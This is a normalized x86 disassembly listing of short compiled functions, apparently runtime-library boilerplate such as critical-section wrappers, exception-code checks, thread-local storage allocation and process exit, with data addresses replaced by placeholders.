mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_405da6
call sub_405afe
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_404db5
pop ecx
retn
call sub_40b3b0
sub_40680d
push [ ebp + 0x8 ]
call sub_406a35
pop ecx
retn
sub_406a2c
push 0xa
call sub_4090a1
pop ecx
retn
sub_406b2f
push 0xa
call sub_4090a1
pop ecx
retn
sub_406bed
push 0xb
call sub_4090a1
pop ecx
retn
sub_406d3d
push [ ebp + 0x8 ]
call sub_406a35
pop ecx
retn
sub_406f84
xor eax eax
inc eax
retn
sub_4081f5
push 0x1
call sub_4090a1
pop ecx
retn
sub_4082d6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_408200
add esp 0xc
pop ebp
retn 0x4
sub_408309
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_40d2b1
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_40833c
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_408200
add esp 0xc
pop ebp
retn 0x8
sub_40853f
push 0xc
push r--data
call sub_405254
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_405299
retn
sub_40855c
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_4085f1
call sub_40858f
mov [ rw-data ] eax
xor eax eax
retn
sub_408dde
push [ ebp + 0x8 ]
call sub_406a35
pop ecx
retn
sub_4090a1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_409172
push 0xa
call sub_4090a1
pop ecx
retn
sub_409c72
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_409d2d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_409d02
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_409d45
push 0x8
call sub_40917b
pop ecx
retn
sub_409d4e
push 0x8
call sub_4090a1
pop ecx
retn
sub_409f34
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_4090a1
pop ecx
sub_409f49
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_409e1d
add esp 0xc
pop ebp
retn
sub_409f5f
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_409e1d
add esp 0xc
pop ebp
retn
sub_409f75
push 0x1
push 0x0
push 0x0
call sub_409e1d
add esp 0xc
retn
sub_409f84
push 0x1
push 0x1
push 0x0
call sub_409e1d
add esp 0xc
retn
sub_40a1c5
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
and [ eax + 0x8 ] 0x0
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_40a23f
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_404db5
pop ecx
sub_40a255
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_40a283
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_40dc04
pop ecx
retn
sub_40a41b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_40a4bf
push 0x0
call sub_40a44d
pop ecx
retn
sub_40a53a
call [ TlsAlloc@IAT ]
retn 0x4
sub_40a689
push 0xd
call sub_4090a1
pop ecx
retn
sub_40a692
push 0xc
call sub_4090a1
pop ecx
retn
sub_40a848
push 0xd
call sub_4090a1
pop ecx
retn
sub_40a854
push 0xc
call sub_4090a1
pop ecx
retn
sub_40ab63
push 0x4
call sub_4090a1
pop ecx
retn
sub_40abae
push sub_40ab6c
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_40b39e
push [ ebp + 0x8 ]
call sub_406a35
pop ecx
retn
sub_40b3a8
and [ rw-data ] 0x0
retn
sub_40b446
push 0x1
call sub_4090a1
pop ecx
retn
sub_40b5e3
push [ ebp + 0x8 ]
call sub_406a35
pop ecx
retn
sub_40b876
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b75f
add esp 0x10
pop ebp
retn
sub_40b8c8
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_40b890
pop ecx
pop ecx
pop ebp
retn
sub_40b90b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40b93b
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_40b952
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_405299
retn
push 0x8
call [ SetLastError@IAT ]
sub_40bc3b
push 0xd
call sub_4090a1
pop ecx
retn
sub_40c006
push 0xd
call sub_4090a1
pop ecx
retn
sub_40c03f
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_40bea5
pop ecx
mov [ rw-data ] 0x1
sub_40c376
push 0xc
call sub_4090a1
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_40c50f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c3a3
add esp 0x14
pop ebp
retn
sub_40cffb
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40cdd0
add esp 0x10
pop ebp
retn
sub_40d17f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d015
add esp 0x10
pop ebp
retn
sub_40d285
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_40d1bc
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_40d2d0
call eax
retn
sub_40d645
push 0x8
push r--data
call sub_405254
call sub_40a714
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_40ef8e
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_40d665
xor eax eax
inc eax
retn
sub_40d67e
push sub_40d645
call sub_40a44d
pop ecx
mov [ rw-data ] eax
retn
sub_40d68f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_40d6e4
push [ rw-data ]
call sub_40a4c8
pop ecx
retn
sub_40d865
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_4090a1
pop ecx
sub_40d8a1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40d8b0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40dc6b
push 0xe
call sub_4090a1
pop ecx
retn
sub_40de04
push 0x4
call sub_4090a1
pop ecx
retn
sub_40de79
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_40de26
add esp 0x10
pop ebp
retn
sub_40de91
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_40e930
push 0x2
call sub_409cd9
pop ecx
retn
sub_40f2e0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40b8e0
sub_40f2f6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40b8e0
sub_40f30c
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_40eb68
add esp 0xc
pop ebp
retn
sub_40f5a0
lea eax [ edx - 0x1 ]
pop ebx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_40f910
mov ecx rw-data
call sub_40117a
push sub_40f93c
call sub_405612
pop ecx
retn
sub_40f926
mov ecx rw-data
call sub_40117a
push sub_40f946
call sub_405612
pop ecx
retn
sub_40f93c
mov ecx rw-data
jmp sub_401000
sub_40f946
mov ecx rw-data
jmp sub_401000
sub_40f950
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_40a23f
